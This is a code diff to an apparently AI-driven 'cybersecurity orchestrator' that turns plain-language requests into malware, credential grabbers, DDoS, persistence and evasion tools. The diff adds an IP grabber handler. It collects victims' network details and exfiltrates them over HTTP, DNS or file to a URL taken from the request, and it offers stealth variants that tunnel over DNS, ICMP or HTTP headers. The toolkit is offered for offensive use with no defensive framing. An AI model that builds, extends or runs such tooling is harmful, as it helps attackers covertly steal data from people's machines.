@@ -17,6 +17,7 @@ from cybersecurity.malware_builder import MalwareBuilder
 from cybersecurity.advanced_payloads import AdvancedPayloads
 from cybersecurity.ai_malware_generator import AIMalwareGenerator
 from cybersecurity.ai_credential_grabber import AICredentialGrabber
+from cybersecurity.ip_grabber import IPGrabber
 from mobile_security import iOSTestingTools, AndroidTestingTools
 from security.vulnerability_scanner import VulnerabilityScanner
 from cybersecurity.improvements import ImprovedNLP, EnhancedAuthorization, VSOCReporter
@@ -42,6 +43,7 @@ class EnhancedCybersecurityOrchestrator:
         self.advanced_payloads = AdvancedPayloads()
         self.ai_malware_generator = AIMalwareGenerator()
         self.ai_grabber = AICredentialGrabber()
+        self.ip_grabber = IPGrabber()
         self.ios_tools = iOSTestingTools()
         self.android_tools = AndroidTestingTools()
         self.vulnerability_scanner = VulnerabilityScanner()
@@ -102,6 +104,11 @@ class EnhancedCybersecurityOrchestrator:
         if any(word in request_lower for word in ["ai grabber", "credential grabber", "password grabber", 
                                                    "ai grab", "grab credentials", "harvest credentials"]):
             return self._handle_ai_grabber(request)
+        
+        # IP grabber
+        if any(word in request_lower for word in ["ip grabber", "grab ip", "get ip", "ip grab", 
+                                                   "network grabber", "grab network info"]):
+            return self._handle_ip_grabber(request)
         
         # Build custom malware
         if any(word in request_lower for word in ["build", "create custom", "make", "generate"]):
@@ -396,7 +403,74 @@ class EnhancedCybersecurityOrchestrator:
             return self.base_orchestrator.process(
                 f"{SECURITY_PRIVACY_PROMPT}\n\nUser question: {request}"
             )
-        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, custom malware builder, advanced payloads, AI malware generation, AI credential grabber, iOS/Android security tools, scanning, reporting."
+        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, custom malware builder, advanced payloads, AI malware generation, AI credential grabber, IP grabber, iOS/Android security tools, scanning, reporting."
+    
+    def _handle_ip_grabber(self, request: str) -> str:
+        """Handle IP grabber requests"""
+        request_lower = request.lower()
+        
+        # Extract grab types
+        grab_types = []
+        if "local" in request_lower or "local ip" in request_lower:
+            grab_types.append("local_ip")
+        if "public" in request_lower or "public ip" in request_lower:
+            grab_types.append("public_ip")
+        if "network" in request_lower or "network info" in request_lower:
+            grab_types.append("network_info")
+        if "dns" in request_lower:
+            grab_types.append("dns_servers")
+        if "connection" in request_lower:
+            grab_types.append("connections")
+        if "routing" in request_lower or "route" in request_lower:
+            grab_types.append("routing")
+        if "arp" in request_lower:
+            grab_types.append("arp")
+        
+        grab_types = grab_types or ["local_ip", "public_ip", "network_info", "dns_servers"]
+        
+        # Extract exfiltration method
+        exfil_method = "http"
+        if "dns" in request_lower and "exfil" in request_lower:
+            exfil_method = "dns"
+        elif "file" in request_lower:
+            exfil_method = "file"
+        
+        # Extract exfil URL
+        import re
+        url_match = re.search(r'https?://[^\s]+', request)
+        exfil_url = url_match.group() if url_match else None
+        
+        # Check for advanced features
+        if any(word in request_lower for word in ["advanced", "geolocation", "whois", "port scan", "subnet"]):
+            features = []
+            if "geolocation" in request_lower or "geo" in request_lower:
+                features.append("geolocation")
+            if "whois" in request_lower:
+                features.append("whois")
+            if "port" in request_lower or "scan" in request_lower:
+                features.append("port_scan")
+            if "subnet" in request_lower:
+                features.append("subnet_scan")
+            features = features or ["geolocation", "whois"]
+            
+            result = self.ip_grabber.create_advanced_ip_grabber(features)
+            return f"Created advanced IP grabber: {result['file']}. Features: {', '.join(result['features'])}. {result['warning']}"
+        
+        # Check for stealth
+        elif any(word in request_lower for word in ["stealth", "hidden", "covert"]):
+            stealth_method = "dns"
+            if "icmp" in request_lower:
+                stealth_method = "icmp"
+            elif "http" in request_lower and "header" in request_lower:
+                stealth_method = "http_headers"
+            
+            result = self.ip_grabber.create_stealth_ip_grabber(stealth_method)
+            return f"Created stealth IP grabber: {result['file']}. Method: {result['stealth_method']}. {result['warning']}"
+        
+        # Standard IP grabber
+        else:
+            result = self.ip_grabber.create_ip_grabber(grab_types, exfil_method, exfil_url)
+            return f"Created IP grabber: {result['file']}. Types: {', '.join(result['grab_types'])}. Method: {result['exfil_method']}. {result['warning']}"
     
     def _handle_ai_grabber(self, request: str) -> str:
         """Handle AI credential grabber requests"""
